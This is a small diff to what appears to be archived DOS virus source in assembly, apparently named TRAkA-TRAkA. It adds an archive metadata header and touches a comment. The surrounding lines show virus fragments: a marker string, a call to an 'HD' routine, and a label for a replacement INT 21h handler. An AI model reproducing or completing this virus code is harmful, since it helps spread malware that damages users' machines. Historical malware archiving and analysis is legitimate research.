@@ -1,3 +1,14 @@
+; ------------------------------------------------------------
+; name      T
+; type      asm
+; cve       —
+; year      unknown
+; os        DOS
+; authors   unknown
+; source    krisyotam
+; archived  krisyotam (2026)
+; notes     —
+; ------------------------------------------------------------
 ;
 ;       MODIFIED TO COMPILE ON ENGLISH VERSION OF TASM
 ;               see trkatrka.org for original source
@@ -222,7 +233,7 @@ memo_ria:
     call HD
     retf
 
-;se�al db '[TRAkA-TRAkA]'
+;se�al db '[TRAkA-TRAkA]'
 iname db '[TRAkA-TRAkA]'
 
 Nueva_int21:
